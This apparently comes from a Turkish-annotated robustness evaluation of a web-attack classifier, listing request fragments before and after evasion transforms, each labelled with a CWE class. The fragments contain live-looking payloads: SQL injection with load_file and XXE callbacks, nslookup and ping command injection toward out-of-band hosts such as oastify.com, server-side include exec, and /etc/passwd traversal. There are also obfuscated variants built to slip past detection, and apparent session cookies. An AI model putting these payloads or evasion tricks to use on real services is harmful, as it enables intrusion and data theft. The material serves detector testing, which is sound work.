  - sonra: `oRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; AS=v%3D1%26s%3DRpo3auix%26d%3DA685925d6%7CYPcb0Hn.2Wryt9O9ybqO3Kf_vwISX0T4Rkji3GxwHKuYY92Ipma8ILOYB6YL3gLswUh0mNEspBh0NiQoGaDb1e_Bk7i.oYHtzltlDVBmbFTtglK2a2fSHI8dcQcIAxrnVydq3y4p.h1vgAAvt56Pfb954aWbIjpG6J_zGTmauExkWT3bnFBbyjWyU1vrfpcigMtaYsTs9z2DLnNuu8XTq7gKRr.uOV.oouYeE60N5SfhN.4gwvjmFtcnXVAytD6EAU4MKEmFV.QdbT1659mA0K8sygWRFmz1gVVYiBxoQYLJKV75_ZxCJ2BY78`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `: keep-alive Host: mail.yahoo.com Cookie: A1=d%3dAQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA')waitfor%2520delay'0%253a0%253a20'--%26S%3dAQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh`
  - sonra: `: keep-alive Host: mail.yahoo.com Cookie: A1=d%3DAQABBA8iWWgCENZh5vbzGI8SezvNR3FdfiMFEgEBAQFzWmhjaDoRySMA_eMCAA')waitfor%20delay'0%3A0%3A20'--%26S%3DAQAAAmA6DDE45PiZjFyJtcb44dQ; A3=d=AQABBA8iWWgCENZh`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Decqh31g2ei%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eyd`
  - sonra: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Decqh31g2ei%27%22%60%27%22%2Fecqh31g2ei%2F%3E%3Cecqh31g2ei%2F%5C%3Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%2F%2F%2F_meet%2Fwhoops%2F%2Fn9i1d6ggd4%27%22%60%27%22%2Fn9i1d6ggd4%2F%3E%3Cn9i1d6ggd4%2F%2F%3Eydbzbraqt8%26%26f.sid%3D4533641686418468723%26bl%3Dboq_meetin`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `GET /_gqlug%2522%2520a%253dbwhdzs/bscframe HTTP/1.1 User-Agent: Mozilla/5.0 `
  - sonra: `GET /_gqlug%22%20a%3Dbwhdzs/bscframe HTTP/1.1 User-Agent: Mozilla/5.0 `
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `68&j=0&u=1---; gpp=DBAA; gpp_sid=-1; axids=dv360%3deS13RVdPVVpKRTJ1RlR1dy5xQmRYV01fd21iaWc4TnFLdn5B%26gam%3dy-WA7HMt9E2uJEKJ8gTyA0f9nAsgWZERQE~A%26ydsp%3dy-u.kUPy5E2uIa9xWWXcCRSIJwFvKSSupH~A%257cping%2520-n%252021%2520127.0.0.1%257c%257c%2560ping%2520-c%252021%2520127.0.0.1%2560%2520%2523'%2520%257cping%2520-n%252021%2520127.0.0.1%257c%257c%2560ping%2520-c%252021%2520127.0.0.1%2560%2520%2523%255c%`
  - sonra: `68&j=0&u=1---; gpp=DBAA; gpp_sid=-1; axids=dv360%3DeS13RVdPVVpKRTJ1RlR1dy5xQmRYV01fd21iaWc4TnFLdn5B%26gam%3Dy-WA7HMt9E2uJEKJ8gTyA0f9nAsgWZERQE~A%26ydsp%3Dy-u.kUPy5E2uIa9xWWXcCRSIJwFvKSSupH~A%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20%23%5C%22%20%7Cping%20-n%2021%20127.0.0.1%26tbla%3Dy-OOQKF4VE2u`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `n%3Dtrue%26app%3Ddesktop%26hl%3Den%26next%3Dhttps%253A%252F%252Fstudio.youtube.com%252FServiceLogin%253Fservice%253Dyoutube%2526uilel%253D3%2526passive%253Dtrue%2526continue%253Dhttps%25253A%25252F%25252Fwww.youtube.com%25252Fsignin%25253Faction_handle_signin%25253Dtrue%252526app%25253Ddesktop%252526hl%25253Den%252526next%25253Dhttps%2525253A%2525252F%2525252Fstudio.youtube.com%2525252FServiceLogi`
  - sonra: `n%3Dtrue%26app%3Ddesktop%26hl%3Den%26next%3Dhttps%3A%2F%2Fstudio.youtube.com%2FServiceLogin%3Fservice%3Dyoutube%26uilel%3D3%26passive%3Dtrue%26continue%3Dhttps%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Den%26next%3Dhttps%3A%2F%2Fstudio.youtube.com%2FServiceLogin%3Fservice%3Dyoutube%26uilel%3D3%26passive%3Dtrue%26continue%3Dhttps%3A%2F%2Fwww.youtube.com%2F`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `0rnhb6.oastify.com/foo%22/%3e%3c/pns%3e?opparams=%253F&dsh=S-1558277817%3A1751381071927380&access_type=online&client_id=860033281504.apps.googleusercontent.com&o2v=2&prompt=select_account&redirect_uri=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Ftpa%2Fredirect&response_type=code&scope=openid+email+profile&service=lso&state=acrumb%3DRpo3auix%7Csrc%3Dhomepage%7Cpspid%3D2023538075%7Cactivity`
  - sonra: `0rnhb6.oastify.com/foo%22/%3e%3c/pns%3e?opparams=%3F&dsh=S-1558277817%3A1751381071927380&access_type=online&client_id=860033281504.apps.googleusercontent.com&o2v=2&prompt=select_account&redirect_uri=https%3A%2F%2Flogin.yahoo.com%2Faccount%2Fchallenge%2Ftpa%2Fredirect&response_type=code&scope=openid+email+profile&service=lso&state=acrumb%3DRpo3auix%7Csrc%3Dhomepage%7Cpspid%3D2023538075%7Cactivity%3`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `v31; _hp2_hld978135598638730.1566116007=xd9jq679ue%2527%2522`'"/xd9jq679ue/><xd9jq679ue/\>vss0kkxl91&; _hp2_hld6957304609361681.1566116007=wn1o622k7f%2527%2522`'"/wn1o622k7f/><wn1o622k7f/\>i0jo1jih09&; _hp2_props.1566116007=%7B%22campaignId%22%3A%22580662%22%2C%22environment%22%3A%22prod%22%2C%22hasCartEnabled%22%3Afalse%2C%22orgId%22%3A83430%2C%22campaignType%22%3A%22studio%22%2C%22classy-session`
  - sonra: `v31; _hp2_hld978135598638730.1566116007=xd9jq679ue'"`'"/xd9jq679ue/><xd9jq679ue/\>vss0kkxl91&; _hp2_hld6957304609361681.1566116007=wn1o622k7f'"`'"/wn1o622k7f/><wn1o622k7f/\>i0jo1jih09&; _hp2_props.1566116007=%7B%22campaignId%22%3A%22580662%22%2C%22environment%22%3A%22prod%22%2C%22hasCartEnabled%22%3Afalse%2C%22orgId%22%3A83430%2C%22campaignType%22%3A%22studio%22%2C%22classy-session-id%22%3A%224Xey`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `et.google.com%2F_meet%2Fwhoops%3Fhs%3Diousmucl6d%2527%2522%60%2527%2522%2Fiousmucl6d%2F%253E%253Ciousmucl6d%2F%5C%253Eij6jz68u8j%26197%26authuser%3Diousmucl6d%2527%2522%60%2527%2522%2Fiousmucl6d%2F%253E%253Ciousmucl6d%2F%5C%253Eij6jz68u8j%260%26pli%3Diousmucl6d%2527%2522%60%2527%2522%2Fiousmucl6d%2F%253E%253Ciousmucl6d%2F%5C%253Eij6jz68u8j%261%26sc%3Diousmucl6d%2527%2522%60%2527%2522%2Fiousmucl6d%`
  - sonra: `et.google.com%2F_meet%2Fwhoops%3Fhs%3Diousmucl6d%27%22%60%27%22%2Fiousmucl6d%2F%3E%3Ciousmucl6d%2F%5C%3Eij6jz68u8j%26197%26authuser%3Diousmucl6d%27%22%60%27%22%2Fiousmucl6d%2F%3E%3Ciousmucl6d%2F%5C%3Eij6jz68u8j%260%26pli%3Diousmucl6d%27%22%60%27%22%2Fiousmucl6d%2F%3E%3Ciousmucl6d%2F%5C%3Eij6jz68u8j%261%26sc%3Diousmucl6d%27%22%60%27%22%2Fiousmucl6d%2F%3E%3Ciousmucl6d%2F%5C%3Eij6jz68u8j%26232&error=`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Dszg7uv9pjw%2527%2522%60%2527%2522%2Fszg7uv9pjw%2F%253E%253Cszg7uv9pjw%2F%5C%253Ezkglo0lck6%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fs60zfpw2gt%252527%252522%252560%27%252522%252Fs60zfpw2gt%252F%25253E%25253Cs60zfpw2gt%252F%252F%25253Eun`
  - sonra: `et.google.com%2F_meet%2Fwhoops%3Fsc%3Dszg7uv9pjw%27%22%60%27%22%2Fszg7uv9pjw%2F%3E%3Cszg7uv9pjw%2F%5C%3Ezkglo0lck6%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%2F%2F%2F_meet%2Fwhoops%2F%2Fs60zfpw2gt%27%22%60%27%22%2Fs60zfpw2gt%2F%3E%3Cs60zfpw2gt%2F%2F%3Eunh4dsm9se%26%26f.sid%3D699620121813095924%26bl%3Dboq_meeting`

## combo

Varsayım: Kategoriye uygulanabilen tüm dönüşümler birlikte: artifact, sql_comment, html_slash, cmd_quote, path_dot, case, whitespace (çözücüye bağlı encoding_norm hariç).

- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`
  - sonra: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`
- **126 - Path Traversal** (tahmin: 126 - Path Traversal → 126 - Path Traversal)
  - önce: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`
  - sonra: `ive Host: mail.yahoo.com Cookie: A1=d%3d..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252f.%252f..%252fetc%252fpasswd%26S%3dAQAAAmA6DDE45PiZ`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `2522--%253e'--%253e%2560--%253e%253c!--%2523set%2520var%253d%2522ksz%2522%2520value%253d%2522jry18svayb%2522--%253e%253c!--%2523set%2520var%253d%2522mu1%2522%2520value%253d%2522lt03auxc0d%2522--%253e%253c!--%2523echo%2520var%253d%2522ksz%2522--%253e%253c!--%2523echo%2520var%253d%2522mu1%2522--%253e%253c!--%2523exec%2520cmd%253d%2522nslookup%2520-q%253dcname%25206elovfixlyllo5bd1uje4uryiponck78z6n4`
  - sonra: `2522--%253e'--%253e%2560--%253e%253c!--%2523set%2509var%253d%2522ksz%2522%2509value%253d%2522jry18svayb%2522--%253e%253c!--%2523set%2509var%253d%2522mu1%2522%2509value%253d%2522lt03auxc0d%2522--%253e%253c!--%2523echo%2509var%253d%2522ksz%2522--%253e%253c!--%2523echo%2509var%253d%2522mu1%2522--%253e%253c!--%2523exec%2509cmd%253d%2522nslookup%2509-q%253dcname%25096elovfixlyllo5bd1uje4uryiponck78z6n4`
- **1336 - SSTI** (tahmin: 1336 - SSTI → 1336 - SSTI)
  - önce: `44_319500; SID=%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22jfi%22%20value%3d%22ieh0vri9la%22--%3e%3c!--%23set%20var%3d%22lhk%22%20value%3d%22kgj2xtkbnc%22--%3e%3c!--%23echo%20var%3d%22jfi%22--%3e%3c!--%23echo%20var%3d%22lhk%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%20514nie5w8x8kb4ycot6drtex5obmziw6o4cxzrng.oastify.com%22%20--%3e; __Secure-1PSID=g.a000yQhGY0VoMOyczkohxP5V-B`
  - sonra: `44_319500; SID=%22--%3e'--%3e%60--%3e%3c!--%23set%09var%3d%22jfi%22%09value%3d%22ieh0vri9la%22--%3e%3c!--%23set%09var%3d%22lhk%22%09value%3d%22kgj2xtkbnc%22--%3e%3c!--%23echo%09var%3d%22jfi%22--%3e%3c!--%23echo%09var%3d%22lhk%22--%3e%3c!--%23exec%09cmd%3d%22nslookup%09-q%3dcname%09514nie5w8x8kb4ycot6drtex5obmziw6o4cxzrng.cb-listener.net%22%09--%3e; __Secure-1PSID=g.a000yQhGY0VoMOyczkohxP5V-B`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `nzu1NvT8ciE-VSt0MuCDtcuq2GJ6FqxEKX8U5OxY38380321'%20or%205025%3d5025--%20; __Host-GAPS=1:AyoAEX4Vnl822ilRk3tpkgUP2vdBRg:W9_`
  - sonra: `nzu1NvT8ciE-VSt0MuCDtcuq2GJ6FqxEKX8U5OxY38380321'%09or%095025%3d5025--%09; __Host-GAPS=1:AyoAEX4Vnl822ilRk3tpkgUP2vdBRg:W9_`
- **248 - Command Injection** (tahmin: 248 - Command Injection → 248 - Command Injection)
  - önce: `Auq3; OTZ=8138023_44_48_171240_44_31950035363955'%20or%204366%3d4367--%20; SID=g.a000yQhGY0VoMOyczkohxP5V-BmARmxOUk2ao5VK_e`
  - sonra: `Auq3; OTZ=8138023_44_48_171240_44_31950035363955'%09or%094366%3d4367--%09; SID=g.a000yQhGY0VoMOyczkohxP5V-BmARmxOUk2ao5VK_e`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `aDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(select%20load_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mssngki89ax3ku8j.oastify.com%5c%5cqmi')); A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3`
  - sonra: `aDoRySMA_eMCAA&S=AQAAAmA6DDE45PiZjFyJtcb44dQ; A3=(SelECt%2f%2a%2a%2fload_file('%5c%5c%5c%5c9isrzim0p1pos8fg5xnh8xv1mssngki89ax3ku8j.cb%2dlistener.net%5c%5cqmi')); A1S=d=AQABBA8iWWgCENZh5vbzGI8SezvNR3`
- **66 - SQL Injection** (tahmin: 66 - SQL Injection → 66 - SQL Injection)
  - önce: `hHT0lBbhNkZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(select%2520extractvalue(xmltype('%253c%253fxml%2520version%253d%25221.0%2522%2520encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2520root%2520[%2520%253c!ENTITY%2520%2525%2520dqeqf%2520SYSTEM%2520%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%252fl')%2520from`
  - sonra: `hHT0lBbhNkZgl3JljYMqo55M1dyxLNty.w-~A'%257c%257c(sELect%252f%252a%252a%252feXtRacTVALUe(xmltype('%253c%253fxml%2509version%253d%25221.0%2522%2509encoding%253d%2522UTF-8%2522%253f%253e%253c!DOCTYPE%2509root%2509[%2509%253c!ENTITY%2509%2525%2509dqeqf%2509SYSTEM%2509%2522http%253a%252f%252f479modbvewejh34busccxskwbnhi5f73br9kwdj57u.oasti'%257c%257c'fy.com%252f%2522%253e%2525dqeqf%253b]%253e')%252c'%2`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253Cecqh31g2ei%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253Cn9i1d6ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533641686418468723%26bl`
  - sonra: `%2527%2522%60%2527%2522%2Fecqh31g2ei%2F%253E%253CeCQH31G2eI%2F%5C%253Ezfisnh2se5%26232&error=Nc%60https%3A%2F%2Fmeet.google.com%2F_%2FMeetingsDesktopUi%2Fdata%2Fbatchexecute%3Frpcids%3DDYVNp%26source-path%3D%252F%252F%252F_meet%252Fwhoops%252F%252Fn9i1d6ggd4%252527%252522%252560%27%252522%252Fn9i1d6ggd4%252F%25253E%25253CN9I1d6Ggd4%252F%252F%25253Eydbzbraqt8%2526%26f.sid%3D4533641686418468723%26bl`
- **79 - Cross-Site Scripting** (tahmin: 79 - Cross-Site Scripting → 79 - Cross-Site Scripting)
  - önce: `Referer: https://www.yahoo.com/za9wt%>kqdof'/"<pm4ii Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: do`
  - sonra: `Referer: https://www.yahoo.com/za9wt%>kqdof'/"<pm4II Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: do`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: `DELETE /api/users%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.oastify.com.%26%60'/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Wind`
  - sonra: `DELETE /api/users%26n%22%22slookup%09-q%3dcname%09cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.cb-listener.net.%26'%5c%22%600%26n%22%22slookup%09-q%3dcname%09cjzz8cswt5ifspx7kf5x8bcotfzdnfg3br8ez2o.cb-listener.net.%26%60'/2 HTTP/1.1 User-Agent: Mozilla/5.0 (Wind`
- **88 - OS Command Injection** (tahmin: 88 - OS Command Injection → 88 - OS Command Injection)
  - önce: ` -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.oastify.com.&'\"`0&nslookup -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.oastify.com.&`' Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors`
  - sonra: ` -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.cb-listener.net.&'\"`0&nslookup -q=cname e1g1qeayb70harf92hnzqduqbhhf5hy5ttogg45.cb-listener.net.&`' Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors`
- **918 - SSRF** (tahmin: 918 - SSRF → 126 - Path Traversal)
  - önce: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.oastify.com/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
  - sonra: `http%3a//4pup150t4xkw6xq31qtfvshyopujik88ywpoce03.cb-listener.net/%3f2 HTTP/1.1 User-Agent: Mozilla/5.0 (Windows N`
- **918 - SSRF** (tahmin: 918 - SSRF → 918 - SSRF)
  - önce: `ed-Host: f6m0igh4l817n87ei1aqc3y950buzy3mvpjf65uu.oastify.com Pragma: no-cache Cache-Control: no-cache, no-tr`
  - sonra: `ed-Host: f6m0igh4l817n87ei1aqc3y950buzy3mvpjf65uu.cb-listener.net Pragma: no-cache Cache-Control: no-cache, no-tr`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `vice%3D1%26_reqid%3D66655%26rt%3Dc%60401&line=Not%20available HTTP/1.1 5nYTd%3AZDZcre%3BKKym4b%3AwA3h`
  - sonra: `vice%3D1%26_reqid%3D66655%26rt%3Dc%60401&line=Not%09available HTTP/1.1 5nYTd%3AZDZcre%3BKKym4b%3AwA3h`
- **94 - Code Injection** (tahmin: 94 - Code Injection → 94 - Code Injection)
  - önce: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%20available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`
  - sonra: `vice%3D1%26_reqid%3D66653%26rt%3Dc%60401&line=Not%09available HTTP/1.1 gd%3ArNScwd%3BZGeKvd%3Arb5w8b%`

